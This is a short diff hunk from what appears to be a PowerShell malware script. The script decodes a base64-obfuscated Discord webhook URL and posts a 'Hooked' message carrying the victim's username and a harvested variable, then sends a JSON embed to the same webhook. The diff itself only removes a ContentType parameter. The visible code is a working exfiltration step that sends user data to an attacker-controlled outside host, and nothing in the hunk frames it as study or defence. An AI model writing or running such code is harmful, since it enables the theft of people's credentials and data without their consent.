@@ -41,5 +41,5 @@ $decodedUrl = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String
 Invoke-RestMethod -Uri $decodedUrl -Method Post -Body (@{content=":fishing_pole_and_fish: **Hooked:** $($env:USERNAME) - $($lps)"})
 
 # Send the embed to the Discord webhook
-Invoke-RestMethod -Uri $decodedUrl -Method Post -Body $jsonPayload -ContentType 'application/json'
+Invoke-RestMethod -Uri $decodedUrl -Method Post -Body $jsonPayload
 
